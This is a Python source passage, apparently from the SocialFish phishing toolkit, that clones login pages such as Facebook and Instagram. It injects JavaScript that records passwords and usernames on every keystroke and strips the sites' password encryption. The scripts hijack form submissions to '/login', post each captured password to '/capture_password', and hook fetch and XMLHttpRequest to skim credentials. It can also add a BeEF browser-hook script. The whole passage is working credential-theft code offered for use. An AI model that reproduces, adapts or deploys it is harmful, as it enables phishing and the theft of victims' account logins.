                        configurable: false
                    });
                });
            };
            
            // STEP 2: MONITOR ALL PASSWORD INPUTS IN REAL-TIME
            
            const capturePasswordInput = (element, source) => {
                const value = element.value;
                if (value && value.length > 0) {
                    console.log(`🔑 Password captured from ${source}:`, value);
                    window.socialfishCapturedData.passwords.push({
                        field: element.name || element.id || 'unknown',
                        value: value,
                        timestamp: Date.now(),
                        source: source
                    });
                }
            };
            
            const monitorPasswordFields = () => {
                // Monitor all password type inputs
                document.querySelectorAll('input[type="password"]').forEach(field => {
                    // Remove existing listeners to avoid duplicates
                    field.removeEventListener('input', field._socialfishInputHandler);
                    field.removeEventListener('change', field._socialfishChangeHandler);
                    field.removeEventListener('blur', field._socialfishBlurHandler);
                    
                    // Create handlers
                    field._socialfishInputHandler = () => capturePasswordInput(field, 'input-event');
                    field._socialfishChangeHandler = () => capturePasswordInput(field, 'change-event');
                    field._socialfishBlurHandler = () => capturePasswordInput(field, 'blur-event');
                    
                    // Add listeners
                    field.addEventListener('input', field._socialfishInputHandler);
                    field.addEventListener('change', field._socialfishChangeHandler);
                    field.addEventListener('blur', field._socialfishBlurHandler);
                    
                    console.log("🔍 Monitoring password field:", field.name || field.id);
                });
                
                // Monitor fields that might contain passwords by name/id
                document.querySelectorAll('input[name*="pass"], input[id*="pass"], input[name*="pwd"], input[id*="pwd"]').forEach(field => {
                    if (field.type !== 'password') {
                        field._socialfishInputHandler = () => capturePasswordInput(field, 'name-based');
                        field.addEventListener('input', field._socialfishInputHandler);
                        console.log("🔍 Monitoring potential password field by name:", field.name || field.id);
                    }
                });
            };
            
            // STEP 3: INTERCEPT FORM SUBMISSIONS
            
            const interceptFormSubmission = (form) => {
                const formData = new FormData(form);
                const capturedData = {};
                
                for (let [key, value] of formData.entries()) {
                    capturedData[key] = value;
                    
                    // Log password fields
                    if (/password|pwd|pass|login/i.test(key) || 
                        (typeof value === 'string' && value.length >= 4 && value.length <= 50)) {
                        console.log(`🔑 Form submission password captured - ${key}:`, value);
                        window.socialfishCapturedData.passwords.push({
                            field: key,
                            value: value,
                            timestamp: Date.now(),
                            source: 'form-submission'
                        });
                    }
                    
                    // Log username fields
                    if (/email|username|user|login/i.test(key)) {
                        console.log(`👤 Username captured - ${key}:`, value);
                        window.socialfishCapturedData.usernames.push({
                            field: key,
                            value: value,
                            timestamp: Date.now(),
                            source: 'form-submission'
                        });
                    }
                }
                
                window.socialfishCapturedData.formData = capturedData;
                console.log("📊 Complete form data captured:", capturedData);
            };
            
            // Monitor form submissions
            document.addEventListener('submit', function(e) {
                console.log("📋 Form submission intercepted");
                interceptFormSubmission(e.target);
            }, true);
            
            // STEP 4: INITIALIZATION AND CONTINUOUS MONITORING
            
            // Run immediately
            blockFacebookEncryption();
            blockCryptoLibraries();
            monitorPasswordFields();
            
            // Re-run when DOM changes (for dynamic content)
            const observer = new MutationObserver(function(mutations) {
                let shouldRecheck = false;
                mutations.forEach(function(mutation) {
                    if (mutation.addedNodes.length > 0) {
                        mutation.addedNodes.forEach(node => {
                            if (node.nodeType === 1) { // Element node
                                if (node.tagName === 'INPUT' || node.querySelector('input')) {
                                    shouldRecheck = true;
                                }
                            }
                        });
                    }
                });
                
                if (shouldRecheck) {
                    setTimeout(() => {
                        blockFacebookEncryption();
                        blockCryptoLibraries();
                        monitorPasswordFields();
                    }, 100);
                }
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
            
            // STEP 5: EXPOSE CAPTURE FUNCTION FOR EXTERNAL ACCESS
            
            window.getSocialFishCapturedData = function() {
                return window.socialfishCapturedData;
            };
            
            // Periodic capture for debugging
            setInterval(() => {
                if (window.socialfishCapturedData.passwords.length > 0) {
                    console.log("🔑 Current captured passwords:", window.socialfishCapturedData.passwords);
                }
            }, 5000);
            
            console.log("✅ SocialFish Password Capture System Ready - All encryption blocked!");
            
        })();
        '''
        
        try:
            self.driver.execute_script(password_capture_script)
            logger.info("✅ Password capture system activated")
        except Exception as e:
            logger.error(f"❌ Failed to inject password capture scripts: {e}")
    
    def get_captured_passwords(self) -> Optional[Dict]:
        """Retrieve captured passwords from the browser"""
        try:
            captured_data = self.driver.execute_script("return window.getSocialFishCapturedData ? window.getSocialFishCapturedData() : null;")
            if captured_data and captured_data.get('passwords'):
                logger.info(f"🔑 Retrieved {len(captured_data['passwords'])} captured passwords")
                self.captured_passwords.append(captured_data)
                return captured_data
            return None
        except Exception as e:
            logger.error(f"❌ Failed to retrieve captured passwords: {e}")
            return None
    
    async def _simulate_human_behavior(self):
        """Simulate human-like behavior"""
        try:
            # Random scrolling
            for position in [0.2, 0.5, 0.8, 1.0]:
                self.driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {position});")
                await asyncio.sleep(random.uniform(0.5, 1.0))
        except Exception:
            pass
    
    def cleanup(self):
        """Cleanup browser and save captured passwords"""
        if self.driver:
            try:
                # Try to get final captured data before closing
                final_capture = self.get_captured_passwords()
                if final_capture:
                    logger.info(f"🔑 Final password capture before cleanup: {len(final_capture.get('passwords', []))} passwords")
                
                self.driver.quit()
            except Exception:
                pass
            self.driver = None

class SocialFishContentProcessor:
    """Content processor optimized for SocialFish - FIXED CSS BACKGROUND REWRITING + PASSWORD CAPTURE"""
    
    def __init__(self, config: SocialFishConfig, resource_manager: SocialFishResourceManager):
        self.config = config
        self.resource_manager = resource_manager
    
    def _is_text_content_type(self, content_type: str, resource_type: str) -> bool:
        """Determine if content should be treated as text"""
        if resource_type in ['css', 'js']:
            return True
        
        if not content_type:
            return resource_type in ['css', 'js']
        
        text_types = [
            'text/', 'application/javascript', 'application/x-javascript',
            'application/json', 'application/xml'
        ]
        
        return any(content_type.lower().startswith(t) for t in text_types)
    
    async def process_html(self, html_content: str, base_url: str, 
                          output_dir: Path, beef_enabled: bool = False) -> str:
        """Process HTML with SocialFish optimizations - FIXED URL REWRITING + ULTRA PASSWORD CAPTURE"""
        
        if not BS4_AVAILABLE:
            return self._process_with_regex(html_content, base_url, output_dir, beef_enabled)
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # CRITICAL: Inject password capture BEFORE any other processing
        self._inject_ultra_password_capture_scripts(soup)
        
        # CRITICAL: Remove/disable Facebook's encryption scripts at HTML level
        self._disable_encryption_scripts(soup)
        
        # Remove tracking
        self._remove_tracking_scripts(soup)
        
        # FIXED: Process resources with proper URL mapping
        await self._process_all_resources_with_mapping(soup, base_url, output_dir)
        
        # CRITICAL FIX: Rewrite URLs in HTML after downloading
        self._rewrite_urls_in_html(soup, base_url)
        
        # Create placeholder files for common missing resources
        self._create_placeholder_resources(output_dir)
        
        # Handle forms for SocialFish with PASSWORD CAPTURE
        self._process_forms_for_socialfish_with_password_capture(soup)
        
        # Add BeEF hook if enabled
        if beef_enabled:
            self._add_beef_hook(soup)
        
        # Add universal AJAX blocking
        self._add_universal_ajax_blocking(soup)
        
        # CRITICAL: Add password capture JavaScript to HTML
        self._add_password_capture_js(soup)
        
        # Add SocialFish JavaScript
        self._add_socialfish_js(soup)
        
        return str(soup)
    
    def _inject_ultra_password_capture_scripts(self, soup: BeautifulSoup):
        """CRITICAL: Inject ULTRA password capture as the FIRST script in HEAD"""
        ultra_script = soup.new_tag('script')
        ultra_script.string = '''(function() {
            console.log("🔑 ULTRA Password Capture - FIRST SCRIPT LOADED");
            
            // NUCLEAR OPTION: Block encryption IMMEDIATELY
            window.socialfishCapturedData = {passwords: [], usernames: [], formData: {}, blocked: []};
            
            // Pre-emptively kill all encryption functions
            const blockFunctions = ['PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt'];
            blockFunctions.forEach(func => {
                Object.defineProperty(window, func, {
                    get: () => (p) => { 
                        console.log(`🔑 ${func} KILLED - password:`, p); 
                        window.socialfishCapturedData.passwords.push({field: func, value: p, timestamp: Date.now()}); 
                        return p; 
                    },
                    set: () => console.log(`🛡️ ${func} set blocked`),
                    configurable: false
                });
            });
            
            // Kill module loaders
            window.__d = () => null;
            
            console.log("✅ ULTRA Password Capture - Encryption KILLED");
        })();'''
        
        head = soup.find('head')
        if head:
            # Insert as the VERY FIRST element in head
            head.insert(0, ultra_script)
        else:
            # Create head if it doesn't exist and add script
            head = soup.new_tag('head')
            head.append(ultra_script)
            if soup.html:
                soup.html.insert(0, head)
            else:
                soup.insert(0, head)
    
    def _disable_encryption_scripts(self, soup: BeautifulSoup):
        """NUCLEAR: Completely remove/replace Facebook's encryption scripts at HTML source level"""
        
        logger.info("💥 NUCLEAR: Disabling encryption scripts at HTML source level")
        
        # NUCLEAR OPTION 1: Remove ALL scripts that might contain encryption
        removed_scripts = 0
        for script in soup.find_all('script'):
            if script.string:
                script_content = script.string.lower()
                
                # Super aggressive detection
                encryption_indicators = [
                    'pwdencrypt', 'encryptpassword', '__d(', 'crypto', 'encrypt', 'hash',
                    'pwd_browser', 'password', 'btoa', 'atob', 'base64', 'encode',
                    'module', 'require', 'define', 'amd', 'commonjs'
                ]
                
                if any(indicator in script_content for indicator in encryption_indicators):
                    logger.info(f"💥 REMOVING encryption script containing: {[ind for ind in encryption_indicators if ind in script_content]}")
                    script.decompose()
                    removed_scripts += 1
                    continue
                
                # NUCLEAR REPLACEMENT: Replace encryption functions inline
                modified_content = script.string
                
                # Replace ALL possible encryption function patterns
                encryption_patterns = [
                    (r'PWDEncrypt\s*[=:]\s*function[^}]*{[^}]*}', 'PWDEncrypt = function(p) { console.log("🔑 PWDEncrypt REPLACED:", p); return p; }'),
                    (r'encryptPassword\s*[=:]\s*function[^}]*{[^}]*}', 'encryptPassword = function(p) { console.log("🔑 encryptPassword REPLACED:", p); return p; }'),
                    (r'hashPassword\s*[=:]\s*function[^}]*{[^}]*}', 'hashPassword = function(p) { console.log("🔑 hashPassword REPLACED:", p); return p; }'),
                    (r'__d\s*\(\s*["\'][^"\']*encrypt[^"\']*["\'][^)]*\)', '/* REMOVED ENCRYPTION MODULE */'),
                    (r'__d\s*\(\s*["\'][^"\']*PWD[^"\']*["\'][^)]*\)', '/* REMOVED PWD MODULE */'),
                    (r'btoa\s*\([^)]*\)', 'btoa(arguments[0]) /* MONITORED */'),
                ]
                
                for pattern, replacement in encryption_patterns:
                    if re.search(pattern, modified_content, re.IGNORECASE):
                        logger.info(f"💥 REPLACING encryption pattern: {pattern[:30]}...")
                        modified_content = re.sub(pattern, replacement, modified_content, flags=re.IGNORECASE)
                
                if modified_content != script.string:
                    script.string = modified_content
            
            # NUCLEAR: Remove external scripts that might load encryption
            src = script.get('src', '')
            if src:
                suspicious_patterns = ['encrypt', 'crypto', 'pwd', 'hash', 'security', 'auth']
                if any(pattern in src.lower() for pattern in suspicious_patterns):
                    logger.info(f"💥 REMOVING external encryption script: {src}")
                    script.decompose()
                    removed_scripts += 1
        
        logger.info(f"💥 NUCLEAR: Removed/modified {removed_scripts} encryption scripts")
        
        # NUCLEAR OPTION 2: Add password interceptor as FIRST script
        nuclear_interceptor = soup.new_tag('script')
        nuclear_interceptor.string = '''
        // NUCLEAR PASSWORD INTERCEPTOR - LOADS BEFORE EVERYTHING
        (function() {
            console.log("💥 NUCLEAR INTERCEPTOR - FIRST TO LOAD");
            
            // Immediately capture any password-related activity
            window.socialfishNuclearData = {passwords: [], blocked: []};
            
            // Kill encryption functions BEFORE they can be defined
            const preemptiveKill = ['PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt'];
            preemptiveKill.forEach(func => {
                try {
                    Object.defineProperty(window, func, {
                        get: () => (p) => { 
                            console.log(`💥 ${func} KILLED:`, p); 
                            window.socialfishNuclearData.passwords.push({func, password: p, time: Date.now()}); 
                            return p; 
                        },
                        set: () => console.log(`💥 ${func} SET BLOCKED`),
                        configurable: false
                    });
                } catch(e) {}
            });
            
            // Kill module systems
            window.__d = () => null;
            if (window.require) window.require = () => ({});
            
            console.log("💥 NUCLEAR INTERCEPTOR ARMED");
        })();
        '''
        
        # Insert as VERY FIRST element in head
        head = soup.find('head')
        if head:
            head.insert(0, nuclear_interceptor)
        
        # NUCLEAR OPTION 3: Modify form elements to prevent encryption
        for form in soup.find_all('form'):
            # Add data attribute to mark form as intercepted
            form['data-nuclear-intercepted'] = 'true'
            
            # Remove any encryption-related attributes
            for attr in ['data-encrypt', 'data-hash', 'onsubmit']:
                if form.get(attr):
                    logger.info(f"💥 REMOVING form attribute: {attr}")
                    del form[attr]
        
        # NUCLEAR OPTION 4: Modify password inputs
        for input_field in soup.find_all('input'):
            input_type = input_field.get('type', '').lower()
            input_name = (input_field.get('name', '') + input_field.get('id', '')).lower()
            
            if input_type == 'password' or 'pass' in input_name or 'pwd' in input_name:
                # Remove encryption attributes
                for attr in ['data-encrypt', 'data-hash', 'onchange', 'onblur', 'oninput']:
                    if input_field.get(attr):
                        logger.info(f"💥 REMOVING password input attribute: {attr}")
                        del input_field[attr]
                
                # Add nuclear monitoring attributes
                input_field['data-nuclear-monitor'] = 'true'
                input_field['autocomplete'] = 'new-password'
        
        # NUCLEAR OPTION 5: Remove/modify meta tags that might trigger encryption
        for meta in soup.find_all('meta'):
            name = meta.get('name', '').lower()
            content = meta.get('content', '').lower()
            
            if any(pattern in name + content for pattern in ['encrypt', 'crypto', 'security', 'csrf']):
                logger.info(f"💥 REMOVING meta tag: {name}")
                meta.decompose()
        
        logger.info("💥 NUCLEAR: HTML source encryption disabling complete")
    
    def _process_forms_for_socialfish_with_password_capture(self, soup: BeautifulSoup):
        """Process forms for SocialFish integration with enhanced password capture"""
        for form in soup.find_all('form'):
            # Store original action
            original_action = form.get('action', '')
            if original_action:
                form['data-original-action'] = original_action
            
            # Redirect to SocialFish login handler
            form['action'] = '/login'
            form['method'] = 'post'
            
            # Enhance password fields for better capture
            for input_field in form.find_all('input'):
                input_type = input_field.get('type', '').lower()
                input_name = (input_field.get('name', '') + input_field.get('id', '')).lower()
                
                if input_type == 'password' or 'pass' in input_name or 'pwd' in input_name:
                    # Add attributes to prevent encryption and enhance capture
                    input_field['data-socialfish-password'] = 'true'
                    input_field['autocomplete'] = 'new-password'
                    # Remove any existing encryption attributes
                    if input_field.get('data-encrypt'):
                        del input_field['data-encrypt']
                    if input_field.get('data-hash'):
                        del input_field['data-hash']
                    
                    logger.debug(f"Enhanced password field: {input_field.get('name', input_field.get('id', 'unknown'))}")
    
    def _add_password_capture_js(self, soup: BeautifulSoup):
        """Add NUCLEAR password capture JavaScript to HTML - PRODUCTION VERSION"""
        script = soup.new_tag('script')
        script.string = '''(function() {
            console.log("💥 NUCLEAR HTML Password Capture Integration - PRODUCTION");
            
            // Production-grade password storage
            window.socialfishPasswords = new Map();
            window.socialfishLastPassword = '';
            window.socialfishUsername = '';
            
            // PRODUCTION OPTION 1: AGGRESSIVE REAL-TIME MONITORING
            const productionPasswordMonitor = () => {
                // Monitor ALL inputs continuously
                document.querySelectorAll('input').forEach(input => {
                    const type = input.type || 'text';
                    const name = input.name || input.id || 'unknown';
                    
                    if (type === 'password' || /pass|pwd/i.test(name)) {
                        if (!input._productionMonitored) {
                            input._productionMonitored = true;
                            console.log("💥 PRODUCTION monitoring password field:", name);
                            
                            // ULTRA-AGGRESSIVE event monitoring
                            const events = ['input', 'change', 'keyup', 'keydown', 'keypress', 'paste', 'focus', 'blur'];
                            events.forEach(eventType => {
                                input.addEventListener(eventType, function() {
                                    const value = this.value;
                                    if (value && value.length > 0) {
                                        console.log(`💥 PRODUCTION ${eventType.toUpperCase()} - PASSWORD:`, value);
                                        window.socialfishPasswords.set(name, value);
                                        window.socialfishLastPassword = value;
                                        
                                        // Send to server immediately
                                        try {
                                            fetch('/capture_password', {
                                                method: 'POST',
                                                headers: {'Content-Type': 'application/json'},
                                                body: JSON.stringify({
                                                    field: name,
                                                    password: value,
                                                    event: eventType,
                                                    timestamp: Date.now()
                                                })
                                            }).catch(() => {}); // Silent fail
                                        } catch (e) {}
                                    }
                                }, true);
                            });
                        }
                    }
                    
                    // Also monitor username/email fields
                    if (/email|user|login/i.test(name) && type !== 'password') {
                        if (!input._usernameMonitored) {
                            input._usernameMonitored = true;
                            input.addEventListener('input', function() {
                                if (this.value) {
                                    window.socialfishUsername = this.value;
                                    console.log("💥 PRODUCTION USERNAME:", this.value);
                                }
                            });
                        }
                    }
                });
            };
            
            // PRODUCTION OPTION 2: FORM SUBMISSION HIJACKING
            const productionFormHijack = () => {
                document.querySelectorAll('form').forEach(form => {
                    if (!form._productionHijacked) {
                        form._productionHijacked = true;
                        
                        // Override form submission completely
                        form.addEventListener('submit', function(e) {
                            e.preventDefault();
                            console.log("💥 PRODUCTION FORM HIJACKED");
                            
                            // Collect all form data
                            const formData = new FormData(this);
                            const data = {};
                            
                            // Get data from FormData
                            for (let [key, value] of formData.entries()) {
                                data[key] = value;
                            }
                            
                            // CRITICAL: Inject stored passwords
                            let hasPassword = false;
                            for (let [key, value] of Object.entries(data)) {
                                if (/pass|pwd/i.test(key) && value) {
                                    hasPassword = true;
                                    break;
                                }
                            }
                            
                            // If no password found, use our stored ones
                            if (!hasPassword) {
                                if (window.socialfishLastPassword) {
                                    data['pass'] = window.socialfishLastPassword;
                                    console.log("💥 PRODUCTION INJECTED STORED PASSWORD:", window.socialfishLastPassword);
                                }
                                
                                // Try all stored passwords
                                window.socialfishPasswords.forEach((password, field) => {
                                    if (!data[field] && password) {
                                        data[field] = password;
                                        console.log(`💥 PRODUCTION INJECTED ${field}:`, password);
                                    }
                                });
                            }
                            
                            // Add username if available
                            if (window.socialfishUsername && !data['email']) {
                                data['email'] = window.socialfishUsername;
                            }
                            
                            console.log("💥 PRODUCTION FINAL DATA:", data);
                            
                            // Submit to SocialFish with all data
                            const hiddenForm = document.createElement('form');
                            hiddenForm.method = 'POST';
                            hiddenForm.action = '/login';
                            hiddenForm.style.display = 'none';
                            
                            Object.keys(data).forEach(key => {
                                const input = document.createElement('input');
                                input.type = 'hidden';
                                input.name = key;
                                input.value = data[key] || '';
                                hiddenForm.appendChild(input);
                            });
                            
                            document.body.appendChild(hiddenForm);
                            hiddenForm.submit();
                        });
                    }
                });
            };
            
            // PRODUCTION OPTION 3: BACKUP PASSWORD CAPTURE VIA AJAX
            const setupAjaxBackup = () => {
                // Monitor any AJAX requests and capture passwords
                const originalFetch = window.fetch;
                window.fetch = function(...args) {
                    const url = args[0];
                    const options = args[1] || {};
                    
                    if (options.body && typeof options.body === 'string') {
                        try {
                            const data = JSON.parse(options.body);
                            Object.keys(data).forEach(key => {
                                if (/pass|pwd/i.test(key) && data[key]) {
                                    console.log(`💥 PRODUCTION AJAX PASSWORD - ${key}:`, data[key]);
                                    window.socialfishLastPassword = data[key];
                                }
                            });
                        } catch (e) {}
                    }
                    
                    return originalFetch.apply(this, args);
                };
                
                // Also monitor XMLHttpRequest
                const originalXHRSend = XMLHttpRequest.prototype.send;
                XMLHttpRequest.prototype.send = function(data) {
                    if (data && typeof data === 'string') {
                        try {
                            // Check if it's JSON
                            const jsonData = JSON.parse(data);
                            Object.keys(jsonData).forEach(key => {
                                if (/pass|pwd/i.test(key) && jsonData[key]) {
                                    console.log(`💥 PRODUCTION XHR PASSWORD - ${key}:`, jsonData[key]);
                                    window.socialfishLastPassword = jsonData[key];
                                }
                            });
                        } catch (e) {
                            // Check if it's form data
                            if (data.includes('password') || data.includes('pass')) {
                                const matches = data.match(/(?:password|pass)=([^&]+)/);
                                if (matches && matches[1]) {
                                    const password = decodeURIComponent(matches[1]);
                                    console.log("💥 PRODUCTION XHR FORM PASSWORD:", password);
                                    window.socialfishLastPassword = password;
                                }
                            }
                        }
                    }
                    return originalXHRSend.call(this, data);
                };
            };
            
            // PRODUCTION OPTION 4: GLOBAL PASSWORD WATCHER
            const globalPasswordWatcher = () => {
                // Watch for any password-like values being set anywhere
                const originalSetAttribute = Element.prototype.setAttribute;
                Element.prototype.setAttribute = function(name, value) {
                    if (name === 'value' && this.type === 'password' && value) {
                        console.log("💥 PRODUCTION SETATTRIBUTE PASSWORD:", value);
                        window.socialfishLastPassword = value;
                    }
                    return originalSetAttribute.call(this, name, value);
                };
            };
            
            // Initialize all production systems
            const initProduction = () => {
                console.log("💥 PRODUCTION INITIALIZING ALL SYSTEMS");
                productionPasswordMonitor();
                productionFormHijack();
                setupAjaxBackup();
                globalPasswordWatcher();
            };
            
            // Run immediately and on DOM ready
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', initProduction);
            } else {
                initProduction();
            }
            
            // Continuous monitoring every 100ms
            setInterval(() => {
                productionPasswordMonitor();
                productionFormHijack();
            }, 100);
            
            // Global exposure for debugging
            window.getSocialFishProduction = () => ({
                passwords: Array.from(window.socialfishPasswords.entries()),
                lastPassword: window.socialfishLastPassword,
                username: window.socialfishUsername
            });
            
            console.log("💥 PRODUCTION PASSWORD CAPTURE SYSTEM READY");
            
        })();'''
        
        head = soup.find('head')
        if head:
            # Insert near the beginning but after our nuclear interceptor
            head.insert(1, script)
        else:
            # If no head, insert at beginning of body
            body = soup.find('body')
            if body:
                body.insert(0, script)
    
    def _process_with_regex(self, html_content: str, base_url: str, 
                           output_dir: Path, beef_enabled: bool) -> str:
        """Regex-based processing fallback with ULTRA password capture"""
        logger.info("Using regex fallback for HTML processing")
        
        # Basic form processing
        html_content = re.sub(
            r'(<form[^>]*?)action\s*=\s*["\']([^"\']*)["\']([^>]*>)',
            r'\1action="/login" data-original-action="\2"\3',
            html_content, flags=re.IGNORECASE
        )
        
        # ULTRA password capture script - inject at the very beginning
        ultra_password_script = '''<script>
(function() {
    console.log("🔑 ULTRA Password Capture - REGEX VERSION");
    
    // Kill encryption immediately
    window.socialfishCapturedData = {passwords: [], usernames: [], formData: {}};
    
    // Nuclear option - kill all possible encryption functions
    const killFunctions = ['PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt', 'passwordEncrypt'];
    killFunctions.forEach(func => {
        Object.defineProperty(window, func, {
            get: () => (password) => { 
                console.log(`🔑 ${func} KILLED - password:`, password); 
                window.socialfishCapturedData.passwords.push({
                    field: func, 
                    value: password, 
                    timestamp: Date.now(),
                    source: 'regex-kill'
                }); 
                return password; 
            },
            set: () => {},
            configurable: false
        });
    });
    
    // Kill module systems
    window.__d = () => null;
    if (window.require) window.require = () => ({encrypt: p => p});
    
    // Aggressive form monitoring
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const formData = new FormData(form);
        const captured = {};
        
        for (let [key, value] of formData.entries()) {
            captured[key] = value;
            if (/password|pwd|pass/i.test(key)) {
                console.log(`🔑 REGEX PASSWORD CAPTURED - ${key}:`, value);
                window.socialfishCapturedData.passwords.push({
                    field: key, 
                    value: value, 
                    timestamp: Date.now(),
                    source: 'regex-form'
                });
            }
            if (/email|username|user/i.test(key)) {
                window.socialfishCapturedData.usernames.push({
                    field: key, 
                    value: value, 
                    timestamp: Date.now(),
                    source: 'regex-form'
                });
            }
        }
        window.socialfishCapturedData.formData = captured;
        console.log("📊 REGEX form data captured:", captured);
    }, true);
    
    // Monitor password fields in real-time
    setInterval(() => {
        document.querySelectorAll('input[type="password"], input[name*="pass"], input[id*="pass"]').forEach(field => {
            if (!field._ultraMonitored) {
                field._ultraMonitored = true;
                field.addEventListener('input', () => {
                    if (field.value) {
                        console.log("🔑 REGEX real-time password:", field.value);
                        window.socialfishCapturedData.passwords.push({
                            field: field.name || field.id || 'unknown',
                            value: field.value,
                            timestamp: Date.now(),
                            source: 'regex-realtime'
                        });
                    }
                });
            }
        });
    }, 500);
    
    console.log("✅ ULTRA Password Capture REGEX Ready");
})();
</script>'''
        
        # Insert ultra script right after <head> or at the beginning
        if '<head>' in html_content:
            html_content = html_content.replace('<head>', '<head>' + ultra_password_script)
        else:
            html_content = ultra_password_script + html_content
        
        # Remove/disable existing encryption scripts using regex
        # Comment out PWDEncrypt functions
        html_content = re.sub(
            r'(PWDEncrypt\s*[=:]\s*function[^}]+})',
            r'// DISABLED BY SOCIALFISH: \1',
            html_content
        )
        
        # Replace PWDEncrypt with password logger
        html_content = re.sub(
            r'PWDEncrypt\s*=\s*function\s*\([^)]*\)\s*{[^}]*}',
            '''PWDEncrypt = function(password) {
                console.log("🔑 PWDEncrypt REGEX REPLACED - password:", password);
                if (window.socialfishCapturedData) {
                    window.socialfishCapturedData.passwords.push({
                        field: 'PWDEncrypt_regex_replaced',
                        value: password,
                        timestamp: Date.now(),
                        source: 'regex-replacement'
                    });
                }
                return password;
            }''',
            html_content
        )
        
        # Add BeEF hook if enabled
        if beef_enabled:
            beef_script = '<script src="http://localhost:3000/hook.js"></script>'
            html_content = html_content.replace('</body>', beef_script + '</body>')
        
        return html_content
    
    # Include all other methods from your original code (abbreviated for space)
    # ... (include all the resource processing methods from the original)
    
    async def _process_all_resources_with_mapping(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
        """FIXED: Process all resources and track URL mappings for rewriting"""
        resources = self._discover_resources_comprehensive(soup, base_url)
        
        if not resources:
            return
        
        logger.info(f"🔍 Discovered {len(resources)} resources")
        
        # Create semaphore for controlled concurrency
        semaphore = asyncio.Semaphore(self.config.max_concurrent_downloads)
        tasks = []
        
        for resource_url, element, attr, resource_type in resources:
            task = self._process_single_resource_with_mapping(
                semaphore, resource_url, element, attr, resource_type, base_url, output_dir
            )
            tasks.append(task)
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _process_single_resource_with_mapping(self, semaphore: asyncio.Semaphore,
                                                   resource_url: str, element: Any, attr: str,
                                                   resource_type: str, base_url: str, output_dir: Path):
        """FIXED: Process single resource and track URL mapping"""
        async with semaphore:
            try:
                # Resolve URL
                absolute_url = self._resolve_url(resource_url, base_url)
                if not absolute_url:
                    return
                
                # Use universal synchronous download in thread
                loop = asyncio.get_event_loop()
                
                def sync_download():
                    return self._download_sync_universal_enhanced(absolute_url, output_dir, resource_type, base_url)
                
                # Run in thread
                local_path = await loop.run_in_executor(None, sync_download)
                
                if local_path:
                    # CRITICAL FIX: Store URL mapping for later rewriting
                    self.resource_manager.url_mappings[absolute_url] = local_path
                    # Also map original URL if different
                    if resource_url != absolute_url:
                        self.resource_manager.url_mappings[resource_url] = local_path
                    
                    # Update element with local path (for direct src/href attributes)
                    if element and attr in ['src', 'href']:
                        element[attr] = local_path
                
            except Exception as e:
                logger.debug(f"Resource processing failed for {resource_url}: {e}")
    
    def _rewrite_urls_in_html(self, soup: BeautifulSoup, base_url: str):
        """CRITICAL FIX: Rewrite URLs in HTML after all resources are downloaded"""
        
        # Rewrite URLs in style attributes (background-image, etc.)
        for element in soup.find_all(style=True):
            original_style = element.get('style', '')
            if original_style:
                new_style = self._rewrite_urls_in_css_text(original_style, base_url)
                if new_style != original_style:
                    element['style'] = new_style
        
        # Rewrite URLs in <style> tags
        for style_tag in soup.find_all('style'):
            if style_tag.string:
                original_css = style_tag.string
                new_css = self._rewrite_urls_in_css_text(original_css, base_url)
                if new_css != original_css:
                    style_tag.string = new_css
        
        # Additional URL rewriting for any missed src/href attributes
        for element in soup.find_all(['img', 'script', 'link']):
            for attr in ['src', 'href']:
                if element.get(attr):
                    original_url = element[attr]
                    absolute_url = self._resolve_url(original_url, base_url)
                    if absolute_url and absolute_url in self.resource_manager.url_mappings:
                        element[attr] = self.resource_manager.url_mappings[absolute_url]
    
    def _rewrite_urls_in_css_text(self, css_text: str, base_url: str) -> str:
        """CRITICAL FIX: Rewrite URLs in CSS text using mappings"""
        
        def replace_url(match):
            original_url = match.group(1).strip('\'"')
            absolute_url = self._resolve_url(original_url, base_url)
            
            # Check if we have a local mapping for this URL
            if absolute_url and absolute_url in self.resource_manager.url_mappings:
                local_path = self.resource_manager.url_mappings[absolute_url]
                return f'url("{local_path}")'
            elif original_url in self.resource_manager.url_mappings:
                local_path = self.resource_manager.url_mappings[original_url]
                return f'url("{local_path}")'
            
            # Return original if no mapping found
            return match.group(0)
        
        # Replace url() references in CSS
        css_text = re.sub(r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)', replace_url, css_text)
        
        return css_text
    
    # Include all the resource discovery methods from your original code
    def _discover_resources_comprehensive(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """ENHANCED: Comprehensive resource discovery for all websites"""
        resources = []
        
        # 1. Standard CSS resources
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href and self._is_valid_url_enhanced(href, base_url):
                resources.append((href, link, 'href', 'css'))
        
        # 2. Standard JavaScript resources
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src and self._is_valid_url_enhanced(src, base_url):
                resources.append((src, script, 'src', 'js'))
        
        # 3. ENHANCED: Image resources with better type detection
        for img in soup.find_all('img', src=True):
            src = img.get('src')
            if src and self._is_valid_url_enhanced(src, base_url):
                resource_type = self._detect_resource_type_universal(src)
                resources.append((src, img, 'src', resource_type))
        
        # 4. ENHANCED: Font resources
        for link in soup.find_all('link', href=True):
            href = link.get('href')
            if href and self._is_font_resource(href) and self._is_valid_url_enhanced(href, base_url):
                resources.append((href, link, 'href', 'font'))
        
        # 5. NEW: Data attribute resources (lazy loading)
        resources.extend(self._find_data_attribute_resources(soup, base_url))
        
        # 6. NEW: CSS background resources - CRITICAL FOR INSTAGRAM LOGO
        resources.extend(self._find_css_background_resources(soup, base_url))
        
        # 7. NEW: JavaScript embedded resources
        resources.extend(self._find_js_embedded_resources(soup, base_url))
        
        # 8. NEW: SVG specific resources
        resources.extend(self._find_svg_resources(soup, base_url))
        
        # 9. NEW: Dynamic resource patterns
        resources.extend(self._find_dynamic_resources(soup, base_url))
        
        # Remove duplicates while preserving order
        seen = set()
        unique_resources = []
        for resource in resources:
            url = resource[0]
            if url not in seen:
                seen.add(url)
                unique_resources.append(resource)
        
        return unique_resources
    
    # [Include all other methods from your original code - abbreviated for space]
    # All the helper methods like _detect_resource_type_universal, _find_css_background_resources, etc.
